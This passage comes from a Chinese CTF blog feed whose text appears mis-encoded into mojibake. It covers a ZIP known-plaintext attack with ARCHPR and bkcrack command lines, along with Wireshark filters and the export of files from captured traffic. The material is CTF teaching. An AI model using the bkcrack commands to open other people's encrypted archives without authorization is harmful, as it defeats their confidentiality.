å·²ç»æ‰¾åˆ°å¯†é’¥ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªçª—å£ï¼Œæ˜¾ç¤ºåŠ å¯†å¯†é’¥çš„ä¸‰ä¸ª key å€¼ï¼Œæˆ‘è¿™é‡Œæ˜¯ <code>[ df96dc88 b432ddfd df4b9e93 ]</code>ï¼Œè™½ç„¶æ–‡ä»¶å£ä»¤æœªæ‰¾åˆ°ï¼Œä½†ä¸è¦ç´§</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB6.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»6.png"></p><p>ç‚¹å‡»å³è¾¹çš„ç¡®å®šåï¼ŒARCHPR ä¼šè‡ªåŠ¨å¼¹å‡ºä¸€ä¸ªä¿å­˜æ–‡ä»¶çš„çª—å£ï¼Œæ–‡ä»¶åä¸º <code>Desktop_decrypted.zip</code>ï¼Œè¿™ä¸ªå‹ç¼©åŒ…å°±æ˜¯å»é™¤äº†åŠ å¯†çš„ <code>Desktop.zip</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB7.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»7.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB9.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»9.png"></p><p>ç›´æ¥æ­£å¸¸è§£å‹ <code>Desktop_decrypted.zip</code> å³å¯è·å¾—åŠ å¯†çš„ <code>Desktop.zip</code> ä¸­çš„æ‰€æœ‰æ–‡ä»¶</p><hr><h2 id="bkcrack"><a href="#bkcrack" class="headerlink" title="bkcrack"></a>bkcrack</h2><blockquote><p>ä½¿ç”¨ bkcrack å¯ä»¥ä¸éœ€è¦æ˜æ–‡æ–‡ä»¶ï¼Œåªéœ€è¦çŸ¥é“åŠ å¯†å‹ç¼©åŒ…å†…å®¹çš„è¿ç»­ 12 å­—èŠ‚ï¼ˆè‡³å°‘ 12 å­—èŠ‚ï¼ŒçŸ¥é“å¾—è¶Šå¤šç ´è§£å¾—è¶Šå¿«ï¼‰ï¼Œå³å¯è¿›è¡Œæ˜æ–‡æ”»å‡»ï¼Œå‹ç¼©åŒ…è¦é‡‡ç”¨ ZipCrypto ç±»ï¼ˆå¦‚ï¼šStoreï¼‰ç®—æ³•</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/kimci86/bkcrack/releases">kimci86&#x2F;bkcrack: Crack legacy zip encryption with Biham and Kocherâ€™s known plaintext attack.</a></p></blockquote><p>å¸¸ç”¨å‚æ•°ï¼š</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">å«ä¹‰</th></tr></thead><tbody><tr><td align="left">-L</td><td align="left">æŸ¥çœ‹å‹ç¼©åŒ…ä¸­çš„å†…å®¹</td></tr><tr><td align="left">-C</td><td align="left">åŠ å¯†çš„å‹ç¼©åŒ…</td></tr><tr><td align="left">-c</td><td align="left">å‹ç¼©åŒ…å†…åŠ å¯†çš„æ–‡ä»¶ï¼ˆå‚ç…§ <code>bkcrack -L</code> ä¸­çš„ <code>Name</code> é¡¹æ¥å†™ï¼‰</td></tr><tr><td align="left">-p</td><td align="left">æ˜æ–‡å†…å®¹ï¼ˆæ— éœ€å‹ç¼©ä¸º zipï¼‰</td></tr><tr><td align="left">-k</td><td align="left">è¾“å…¥ key</td></tr><tr><td align="left">-x</td><td align="left">åç§»é‡</td></tr><tr><td align="left">-d</td><td align="left">æ”»å‡»å®Œæˆåå¯¼å‡ºè§£å¯†æ–‡ä»¶</td></tr><tr><td align="left">-U</td><td align="left">å»é™¤æºå¯†ç æŒ‰ç…§æŒ‡å®šçš„æ–°å¯†ç ä¿å­˜å‹ç¼©åŒ…</td></tr></tbody></table><ol><li>æŸ¥çœ‹å‹ç¼©åŒ…ä¸­çš„å†…å®¹</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-L</span> zipå‹ç¼©åŒ…<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB10.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»10.png"></p><ol start="2"><li>æ ¹æ®æ˜æ–‡æ–‡ä»¶è·å–åŠ å¯†å‹ç¼©åŒ…çš„ä¸‰ä¸ªå¯†é’¥ key</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-C</span> zipåŠ å¯†å‹ç¼©åŒ… <span class="token parameter variable">-c</span> zipåŠ å¯†å‹ç¼©åŒ…å†…çš„æ–‡ä»¶ <span class="token parameter variable">-p</span> æ˜æ–‡æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB11.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»11.png"></p><ol start="3"><li>è¿˜åŸåŠ å¯†å‹ç¼©åŒ…ä¸­çš„å†…å®¹</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-C</span> zipåŠ å¯†å‹ç¼©åŒ… <span class="token parameter variable">-c</span> zipåŠ å¯†å‹ç¼©åŒ…å†…çš„æ–‡ä»¶<span class="token punctuation">(</span>æƒ³è¦è¿˜åŸçš„<span class="token punctuation">)</span> <span class="token parameter variable">-k</span> key1 key2 key3 <span class="token parameter variable">-d</span> è¿˜åŸåä¿å­˜çš„æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB12.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»12.png"></p><ol start="4"><li>å»é™¤åŠ å¯†å‹ç¼©åŒ…çš„å¯†ç </li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-C</span> zipåŠ å¯†å‹ç¼©åŒ… <span class="token parameter variable">-k</span> key1 key2 key3 <span class="token parameter variable">-U</span> å»é™¤åŠ å¯†åçš„å‹ç¼©åŒ…æ–‡ä»¶è·¯å¾„ æŒ‡å®šæ–°çš„è§£å‹å¯†ç <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB13.png" alt="CTF-Misc_æ˜æ–‡æ”»å‡»13.png"></p><p>ä½¿ç”¨ä¸Šè¿°å‘½ä»¤ï¼Œåœ¨ <code>~/Desktop.zip</code> åŒç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„å‹ç¼©åŒ… <code>unlocked.zip</code>ï¼Œè§£å‹å¯†ç ä¸º <code>123456</code>ï¼Œå‹ç¼©åŒ…å†…å®¹ä¸ <code>~/Desktop.zip</code> ä¸€æ¨¡ä¸€æ ·</p><ol start="5"><li>æ ¹æ®å¯†é’¥ key å°è¯•è¿˜åŸå‡ºå¯†ç ï¼ˆ<em>å¤ªè€—æ—¶ï¼Œä¸å»ºè®®ä¹Ÿæ²¡å¿…è¦</em>ï¼‰</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-k</span> key1 key2 key3 <span class="token parameter variable">-r</span> å¯†ç é•¿åº¦ ?å‚æ•°<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>å¯†ç é•¿åº¦ä¸º <code>16</code> æ—¶ï¼Œå°è¯• 1 - 16 ä½å¯†ç ï¼›å¯†ç é•¿åº¦ä¸º <code>11..13</code> æ—¶ï¼Œå°è¯• 11 - 13 ä½å¯†ç </p></li><li><p>å‚æ•°ä¸º <code>a</code> ä»£è¡¨æ‰€æœ‰å­—ç¬¦ï¼Œ<code>p</code> ä»£è¡¨å¯æ‰“å°å­—ç¬¦ï¼Œ<code>d</code> ä»£è¡¨æ•°å­—ï¼Œ<code>l</code> ä»£è¡¨å°å†™å­—æ¯ï¼Œ<code>u</code> ä»£è¡¨å¤§å†™å­—æ¯ï¼Œ<code>d/l</code> ä»£è¡¨æ•°å­—å’Œå°å†™å­—æ¯ï¼Œ<code>d/l/u</code> ä»£è¡¨æ•°å­—ã€å°å†™å­—æ¯å’Œå¤§å†™å­—æ¯</p></li></ul><hr>]]></content>
    
    
    <summary type="html">é’ˆå¯¹æœªçŸ¥å¯†ç çš„åŠ å¯†å‹ç¼©åŒ…ï¼Œå¦‚æœå¯ä»¥è·å¾—å‹ç¼©åŒ…ä¸­çš„ä¸€ä¸ªæ–‡ä»¶çš„åŸä»¶ï¼ˆæ–‡ä»¶å¤§å°è¦å¤§äº 12 Byteï¼‰ï¼Œå°±å¯ä»¥åœ¨ä¸éœ€è¦çŸ¥é“è§£å‹å¯†ç çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡è¿™ä¸ªåŸä»¶è¿˜åŸå‡ºå‹ç¼©åŒ…ä¸­çš„æ‰€æœ‰å†…å®¹</summary>
    
    
    
    <category term="å®‰å…¨æ‚é¡¹" scheme="https://www.uf4te.cn/categories/%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Misc" scheme="https://www.uf4te.cn/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>æµé‡åˆ†æ</title>
    <link href="https://www.uf4te.cn/posts/f7dcf1b6.html"/>
    <id>https://www.uf4te.cn/posts/f7dcf1b6.html</id>
    <published>2024-03-31T16:00:00.000Z</published>
    <updated>2024-06-05T06:32:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pcap-æµé‡åŒ…ä¿®å¤"><a href="#pcap-æµé‡åŒ…ä¿®å¤" class="headerlink" title="pcap æµé‡åŒ…ä¿®å¤"></a>pcap æµé‡åŒ…ä¿®å¤</h1><blockquote><p>å¦‚æœæ‰“å¼€æµé‡åŒ…å‡ºç°å¼‚å¸¸ç°è±¡ï¼Œä¾‹å¦‚ï¼š<code>&quot;The capture file appears to be damaged or corrupt.&quot;</code>ï¼Œè¯´æ˜æµé‡åŒ…æŸåï¼Œéœ€è¦ä¿®å¤</p></blockquote><p>åœ¨çº¿ä¿®å¤å·¥å…·ï¼š<a href="https://f00l.de/hacking/pcapfix.php">pcapfix - online pcap &#x2F; pcapng repair service</a></p><p>ä¸Šè¿°ç½‘ç«™ä¿®å¤å®Œæ¯•åï¼Œç‚¹å‡»Â <code>&quot;Get your repaired PCAP-file here.&quot;</code>Â å³å¯ä¸‹è½½æµé‡åŒ…</p><hr><h1 id="Wireshark-çš„ä½¿ç”¨"><a href="#Wireshark-çš„ä½¿ç”¨" class="headerlink" title="Wireshark çš„ä½¿ç”¨"></a>Wireshark çš„ä½¿ç”¨</h1><blockquote><p>Wireshark æ˜¯ç”¨æ¥åˆ†æ pcapã€pcapng æµé‡åŒ…çš„ç½‘ç»œå—…æ¢å™¨ï¼Œé€šå¸¸æ•°æ®åŒ…é‡Œå……æ»¡ç€å¤§é‡æ— å…³çš„æµé‡ä¿¡æ¯ï¼Œå› æ­¤å¯¹æµé‡æ•°æ®è¿›è¡Œåˆ†ç±»å’Œè¿‡æ»¤ååˆ†é‡è¦</p><p>Wireshark ä¸‹è½½åœ°å€ï¼š<a href="https://www.wireshark.org/download.html">wireshark.org</a></p><p>å‚è€ƒæ–‡çŒ®ï¼š</p><ol><li><a href="https://www.freebuf.com/sectool/199838.html">CTFæµé‡åˆ†æä¹‹wiresharkä½¿ç”¨ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></li><li><a href="https://forum.butian.net/share/1958">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-CTFæµé‡åˆ†æ</a></li></ol></blockquote><p>Wireshark çš„ä½¿ç”¨ä¸»è¦åˆ†ä¸º<strong>æ•°æ®åŒ…ç­›é€‰</strong>ã€<strong>æ•°æ®åŒ…æœç´¢</strong>ã€<strong>æ•°æ®åŒ…è¿˜åŸ</strong>ã€<strong>æ•°æ®æå–</strong>å››éƒ¨åˆ†</p><h2 id="æ•°æ®åŒ…ç­›é€‰"><a href="#æ•°æ®åŒ…ç­›é€‰" class="headerlink" title="æ•°æ®åŒ…ç­›é€‰"></a>æ•°æ®åŒ…ç­›é€‰</h2><p>Wireshark æ”¯æŒçš„å„ç±»è¿ç®—ç¬¦ï¼š</p><table><thead><tr><th align="left">è¿ç®—ç¬¦</th><th align="left">æ„ä¹‰</th></tr></thead><tbody><tr><td align="left">&#x3D;&#x3D;</td><td align="left">ç­‰äº</td></tr><tr><td align="left">!&#x3D;</td><td align="left">ä¸ç­‰äº</td></tr><tr><td align="left">&gt;</td><td align="left">å¤§äº</td></tr><tr><td align="left">&lt;</td><td align="left">å°äº</td></tr><tr><td align="left">&gt;&#x3D;</td><td align="left">å¤§äºç­‰äº</td></tr><tr><td align="left">&lt;&#x3D;</td><td align="left">å°äºç­‰äº</td></tr><tr><td align="left">andã€&amp;&amp;</td><td align="left">ä¸</td></tr><tr><td align="left">orã€||</td><td align="left">æˆ–</td></tr><tr><td align="left">xorã€^^</td><td align="left">å¼‚æˆ–</td></tr><tr><td align="left">notã€!</td><td align="left">é</td></tr></tbody></table><hr><h3 id="IP-åœ°å€ç­›é€‰"><a href="#IP-åœ°å€ç­›é€‰" class="headerlink" title="IP åœ°å€ç­›é€‰"></a>IP åœ°å€ç­›é€‰</h3><ol><li>ç­›é€‰æº ip åœ°å€</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ip.src <span class="token operator">==</span> æºipåœ°å€<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>ç­›é€‰ç›®çš„ ip åœ°å€</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ip.dst <span class="token operator">==</span> ç›®çš„ipåœ°å€<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>ç­›é€‰æ‰€æœ‰æº ip åœ°å€æˆ–ç›®çš„ ip åœ°å€</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ip.addr <span class="token operator">==</span> ipåœ°å€<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>ç­›é€‰é™¤æº ip åœ°å€ä»¥å¤–çš„æ‰€æœ‰ ip åœ°å€</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">not ip.src <span class="token operator">==</span> æºipåœ°å€<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="MAC-åœ°å€ç­›é€‰"><a href="#MAC-åœ°å€ç­›é€‰" class="headerlink" title="MAC åœ°å€ç­›é€‰"></a>MAC åœ°å€ç­›é€‰</h3><ol><li>ç­›é€‰æº MAC åœ°å€</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eth.dst <span class="token operator">==</span> æºMACåœ°å€<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>ç­›é€‰ç›®çš„ MAC åœ°å€</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eth.src <span class="token operator">==</span> ç›®çš„MACåœ°å€<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>ç­›é€‰æ‰€æœ‰æº MAC åœ°å€æˆ–ç›®çš„ MAC åœ°å€</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eth.addr <span class="token operator">==</span> MACåœ°å€<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="åè®®ç­›é€‰"><a href="#åè®®ç­›é€‰" class="headerlink" title="åè®®ç­›é€‰"></a>åè®®ç­›é€‰</h3><ol><li>ç­›é€‰ tcp åè®®æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>ç­›é€‰ udp åè®®æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">udp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>ç­›é€‰ http åè®®æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>ç­›é€‰ arp&#x2F;icmp&#x2F;ftp&#x2F;dns&#x2F;ip åè®®æµé‡ï¼ŒåŒç†</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp/icmp/ftp/dns/ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>ç­›é€‰ http åè®®æˆ– icmp åè®®æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http or icmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="ç«¯å£ç­›é€‰"><a href="#ç«¯å£ç­›é€‰" class="headerlink" title="ç«¯å£ç­›é€‰"></a>ç«¯å£ç­›é€‰</h3><ol><li>ç­›é€‰æºç«¯å£ä¸º 80 ç«¯å£çš„ tcp åè®®æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.srcport <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>ç­›é€‰ç›®çš„ç«¯å£ä¸º 80 ç«¯å£çš„ tcp åè®®æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.dstport <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>ç­›é€‰æºç«¯å£ä¸º 80 ç«¯å£çš„ udp åè®®æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">udp.srcport <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>ç­›é€‰ç›®çš„ç«¯å£ä¸º 80 ç«¯å£çš„ udp åè®®æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">udp.dstport <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>ç­›é€‰æºç«¯å£æˆ–ç›®çš„ç«¯å£ä¸º 80 ç«¯å£çš„æ‰€æœ‰ tcp åè®®æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.port <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>ç­›é€‰æºç«¯å£æˆ–ç›®çš„ç«¯å£ä¸º 80 ç«¯å£çš„æ‰€æœ‰æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.port <span class="token operator">==</span> <span class="token number">80</span> or udp.port <span class="token operator">==</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>ç­›é€‰ç«¯å£èŒƒå›´ä¸º 1 ~ 80 ç«¯å£çš„æ‰€æœ‰ tcp åè®®æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.port <span class="token operator">>=</span> <span class="token number">1</span> and tcp.port <span class="token operator">&lt;=</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="æ•°æ®åŒ…é•¿åº¦ç­›é€‰"><a href="#æ•°æ®åŒ…é•¿åº¦ç­›é€‰" class="headerlink" title="æ•°æ®åŒ…é•¿åº¦ç­›é€‰"></a>æ•°æ®åŒ…é•¿åº¦ç­›é€‰</h3><ol><li>ç­›é€‰é•¿åº¦ä¸º 20 çš„ tcp åè®®æµé‡æ•°æ®åŒ…ï¼ˆä¸åŒ…æ‹¬ tcp æœ¬èº«ï¼Œtcp ä¸‹é¢é‚£å—æ•°æ®åŒ…é•¿åº¦ï¼‰</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcp.length <span class="token operator">==</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>ç­›é€‰é•¿åº¦å¤§äº 20 çš„ udp åè®®æµé‡æ•°æ®åŒ…ï¼ˆudp æœ¬èº«å›ºå®šé•¿åº¦ 8 ä¸ udp ä¸‹é¢é‚£å—æ•°æ®åŒ…é•¿åº¦ä¹‹å’Œï¼‰</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">udp.length <span class="token operator">>=</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>ç­›é€‰é•¿åº¦ä¸º 20 çš„æ•´ä¸ªæµé‡æ•°æ®åŒ…ï¼ˆä» eth å¼€å§‹åˆ°æœ€åï¼‰</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">frame.len <span class="token operator">==</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>ç­›é€‰é•¿åº¦ä¸º 20 çš„ ip æµé‡åŒ…</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ip.len <span class="token operator">==</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="HTTP-è¯·æ±‚ç­›é€‰"><a href="#HTTP-è¯·æ±‚ç­›é€‰" class="headerlink" title="HTTP è¯·æ±‚ç­›é€‰"></a>HTTP è¯·æ±‚ç­›é€‰</h3><ol><li>ç­›é€‰ http è¯·æ±‚æ–¹æ³•ä¸º get çš„æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http.request.method <span class="token operator">==</span> <span class="token string">"GET"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>ç­›é€‰ http è¯·æ±‚æ–¹æ³•ä¸º post çš„æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http.request.method <span class="token operator">==</span> <span class="token string">"POST"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>ç­›é€‰ http è¯·æ±‚ URL ä¸º <code>/img/flag.gif</code> çš„æµé‡</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http.request.uri <span class="token operator">==</span> <span class="token string">"/img/flag.gif"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>ç­›é€‰ http è¯·æ±‚å†…å®¹åŒ…å« <code>flag</code> çš„æµé‡ï¼ˆcontains ä»…æ”¯æŒä¸€ä¸ªï¼‰</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http contains <span class="token string">"flag"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>ç­›é€‰ http è¯·æ±‚å†…å®¹åŒ…å« <code>ctf</code> æˆ– <code>flag</code> çš„æµé‡ï¼ˆmatches æ”¯æŒå¤šä¸ªï¼‰</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http matches <span class="token string">"ctf|flag"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="æ•°æ®åŒ…æœç´¢"><a href="#æ•°æ®åŒ…æœç´¢" class="headerlink" title="æ•°æ®åŒ…æœç´¢"></a>æ•°æ®åŒ…æœç´¢</h2><blockquote><p>Wirshark ä½¿ç”¨å¿«æ·é”® â€œCtrl + Fâ€å¯ä»¥è¿›è¡Œå…³é”®å­—æœç´¢</p></blockquote><p>æ”¯æŒåå…­è¿›åˆ¶ã€å­—ç¬¦ä¸²å’Œæ­£åˆ™è¡¨è¾¾å¼ç­‰æ–¹å¼ï¼Œå­—ç¬¦ä¸²æœç´¢æ¯”è¾ƒå¸¸ç”¨</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901.png" alt="CTF-Misc_æµé‡åˆ†æ1.png"></p><p>æœç´¢æ å·¦ä¾§å¯ä»¥é€‰æ‹©åˆ†ç»„åˆ—è¡¨ã€åˆ†ç»„è¯¦æƒ…å’Œåˆ†ç»„å­—èŠ‚æµï¼Œåˆ†åˆ«å¯¹åº”æœç´¢ Wireshark ç•Œé¢çš„ä¸‰ä¸ªä¸åŒåŒºåŸŸ</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902.png" alt="CTF-Misc_æµé‡åˆ†æ2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%903.png" alt="CTF-Misc_æµé‡åˆ†æ3.png"></p><hr><h2 id="æ•°æ®åŒ…è¿˜åŸ"><a href="#æ•°æ®åŒ…è¿˜åŸ" class="headerlink" title="æ•°æ®åŒ…è¿˜åŸ"></a>æ•°æ®åŒ…è¿˜åŸ</h2><blockquote><p>Wireshark å¯ä»¥é€šè¿‡è¿½è¸ªæµå°† http æˆ– tcp æµé‡é›†åˆåœ¨ä¸€èµ·å¹¶è¿˜åŸæˆåŸå§‹æ•°æ®</p></blockquote><p>é€‰ä¸­ä¸€ä¸ªæµé‡åŒ…ï¼Œå³é”®è¿½è¸ªæµï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%904.png" alt="CTF-Misc_æµé‡åˆ†æ4.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%907.png" alt="CTF-Misc_æµé‡åˆ†æ7.png"></p><hr><h2 id="æ•°æ®æå–"><a href="#æ•°æ®æå–" class="headerlink" title="æ•°æ®æå–"></a>æ•°æ®æå–</h2><blockquote><p>Wireshark æ”¯æŒæå–é€šè¿‡ http ä¼ è¾“ï¼ˆä¸Šä¼ &#x2F;ä¸‹è½½ï¼‰çš„æ–‡ä»¶å†…å®¹</p></blockquote><ol><li>åœ¨èœå•æ çš„æ–‡ä»¶é€‰é¡¹ä¸­ï¼Œé€‰æ‹© <code>å¯¼å‡ºå¯¹è±¡ --&gt; HTTP</code>ï¼š</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%905.png" alt="CTF-Misc_æµé‡åˆ†æ5.png"></p><p>é€‰æ‹©æƒ³è¦å¯¼å‡ºçš„æ–‡ä»¶ï¼Œç‚¹å‡»ä¿å­˜å³å¯ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%906.png" alt="CTF-Misc_æµé‡åˆ†æ6.png"></p><ol start="2"><li>åœ¨åˆ†ç»„è¯¦æƒ…çª—å£ä¸­ï¼Œé€‰æ‹©è¦å¯¼å‡ºçš„å¯¹è±¡ï¼Œ<code>å³é”® --&gt; å¯¼å‡ºåˆ†ç»„å­—èŠ‚æµ</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%908.png" alt="CTF-Misc_æµé‡åˆ†æ8.png"></p><blockquote><p>å¦‚æœæ˜¯èœåˆ€ä¸‹è½½æ–‡ä»¶çš„æµé‡ï¼Œéœ€è¦åˆ é™¤åˆ†ç»„å­—èŠ‚æµå‰å¼€å¤´å’Œç»“å°¾çš„ <code>X@Y</code> å­—ç¬¦ï¼Œå¦åˆ™ä¸‹è½½çš„æ–‡ä»¶ä¼šå‡ºé”™</p></blockquote><p>é¦–å…ˆåœ¨åˆ†ç»„è¯¦æƒ…çª—å£ä¸­ï¼Œé€‰æ‹©è¦å¯¼å‡ºçš„å¯¹è±¡ï¼Œ<code>å³é”® --&gt; æ˜¾ç¤ºåˆ†ç»„å­—èŠ‚</code></p><p>ç„¶ååœ¨å¼¹å‡ºçš„çª—å£ä¸­è®¾ç½®å¼€å§‹å’Œç»“æŸçš„å­—èŠ‚ï¼ˆ<em>åŸå­—èŠ‚æ•°å¼€å¤´åŠ  3ï¼Œç»“å°¾å‡ 3</em>ï¼‰ï¼Œå¯¼å‡ºä¿å­˜</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%909.png" alt="CTF-Misc_æµé‡åˆ†æ9.png"></p><hr><h1 id="USB-æµé‡"><a href="#USB-æµé‡" class="headerlink" title="USB æµé‡"></a>USB æµé‡</h1><blockquote><p>USB æµé‡æ•°æ®å­˜æ”¾åœ¨ <code>Leftover Capture Data</code> åŸŸä¸­ï¼Œå¯åœ¨ Wireshark 